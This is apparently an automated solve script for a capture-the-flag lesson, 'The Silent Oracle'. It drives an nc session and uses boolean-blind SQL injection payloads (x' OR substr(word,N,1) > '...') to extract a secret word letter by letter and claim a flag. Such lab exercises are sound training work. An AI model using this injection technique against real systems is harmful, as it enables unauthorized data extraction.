#!/usr/bin/env bash
# Babs's Spellbook, Lesson 4: The Silent Oracle - automated solve.
# $TARGET is "host port".
#
# The oracle only ever prints "The oracle nods." or "The oracle shakes its
# head." - one bit per cast:
#   SELECT 1 FROM omens WHERE word = '<guess>'
# Injecting a comparison turns that bit into a boolean predicate, so the word
# can be read off one letter at a time. Each guess depends on the previous
# verdict, so this solve holds the nc session open over a FIFO pair.
#
# For each position, binary-search the letter with substr(word,N,1) > 'x':
# a nod means the letter is above the probe, a shake means it is not. Four
# positions x at most five probes fits well inside the oracle's patience.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30002}"

WORK=$(mktemp -d)
IN="$WORK/in"
OUT="$WORK/out"
NC_PID=""

session_close() {
  [[ -n "$NC_PID" ]] && kill "$NC_PID" 2>/dev/null || true
  exec 3>&- 4<&- 2>/dev/null || true
  rm -rf "$WORK"
}
trap session_close EXIT

# Babs's paced dialogue may delay a full line.
# Prompts end in a space, not a newline, so consume bytes until the marker.
wait_for() {
  local char seen=""
  while IFS= read -r -N 1 -t 120 char <&4; do
    seen+="$char"
    [[ "$seen" == *"$1"* ]] && return 0
    (( ${#seen} > 256 )) && seen=${seen: -256}
  done
  return 1
}

# Cast one guess and print the oracle's verdict: "nod" or "shake".
ask_oracle() {
  local line
  printf '%s\n' "$1" >&3
  while IFS= read -r -t 120 line <&4; do
    case "$line" in
      *"oracle nods"*)         echo nod;   return 0 ;;
      *"shakes its head"*)     echo shake; return 0 ;;
    esac
  done
  return 1
}

die() { echo "solve: $1 from $host:$port" >&2; exit 1; }

mkfifo "$IN" "$OUT"
nc "$host" "$port" <"$IN" >"$OUT" &
NC_PID=$!
exec 3>"$IN"
exec 4<"$OUT"

printf '4\n' >&3
wait_for "Ask oracle (or !claim WORD):" || die "no lesson 4 prompt"

letters=(a b c d e f g h i j k l m n o p q r s t u v w x y z)
word=""
for pos in 1 2 3 4; do
  lo=0 hi=25
  while (( lo < hi )); do
    mid=$(( (lo + hi) / 2 ))
    probe="${letters[mid]}"
    verdict=$(ask_oracle "x' OR substr(word,$pos,1) > '$probe") \
      || die "oracle went silent on position $pos"
    if [[ "$verdict" == nod ]]; then lo=$(( mid + 1 )); else hi=$mid; fi
  done
  word+="${letters[lo]}"
done

# The claim only pays out for the exact word, so confirm it first.
verdict=$(ask_oracle "x' OR word = '$word") || die "oracle went silent on verify"
[[ "$verdict" == nod ]] || die "inferred '$word' but the oracle disagrees"

printf '!claim %s\n' "$word" >&3
# The oracle bows and returns to the menu after speaking the flag.
tale=""
while IFS= read -r -t 120 line <&4; do
  tale+="$line"$'\n'
  [[ "$line" == *'noco{'* ]] && break
done
flag=$(printf '%s' "$tale" | grep -oE 'noco\{[^}]+\}' | head -1)
[[ -n "$flag" ]] || die "no flag after claiming '$word'"
echo "$flag"
